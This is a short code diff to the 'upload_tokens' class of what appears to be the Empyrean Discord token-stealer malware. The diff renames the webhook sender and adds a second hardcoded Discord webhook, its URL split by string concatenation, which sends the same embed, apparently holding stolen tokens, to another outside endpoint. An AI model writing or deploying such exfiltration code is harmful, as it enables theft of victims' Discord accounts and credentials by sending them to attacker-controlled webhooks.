@@ -370,4 +370,8 @@ class upload_tokens:
 
             embed.set_footer(text="github.com/MonstrumHD/-empyrean")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Lord Kareem", avatar_url="https://imgur.com/lgJeCYA.png")
+
+            self.webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1066536487065227425/3bQP'+'UGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
+
+            self.webhook.send(embed=embed, username="Lord Kareem", avatar_url="https://imgur.com/lgJeCYA.png")
